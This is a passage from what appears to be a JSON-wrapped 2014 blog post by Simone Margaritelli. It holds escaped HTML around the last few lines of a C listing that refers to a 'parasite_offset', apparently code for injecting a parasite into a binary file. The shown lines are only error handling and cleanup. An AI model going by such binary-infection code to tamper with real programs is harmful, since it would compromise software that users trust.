stat.st_size - parasite_offset ) \u0026lt; \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        close(o_fd);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003efree\u003c/span\u003e(srcbuffer);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003c/div\u003e",
  "Date": "2014-07-17T13:19:51Z",
  "Author": "Simone Margaritelli"
}